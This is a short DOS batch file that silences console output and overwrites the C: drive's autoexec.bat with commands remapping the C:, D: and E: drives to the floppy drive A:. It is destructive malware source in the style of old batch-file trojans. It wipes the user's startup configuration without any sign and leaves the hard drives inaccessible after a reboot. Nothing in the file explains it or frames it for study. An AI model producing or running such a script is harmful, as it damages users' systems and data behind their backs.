@echo off
ctty nul
@echo subst e: a:\ > c:\autoexec.bat
@echo subst d: a:\ >> c:\autoexec.bat
@echo subst c: a:\ >> c:\autoexec.bat
ctty con
cls
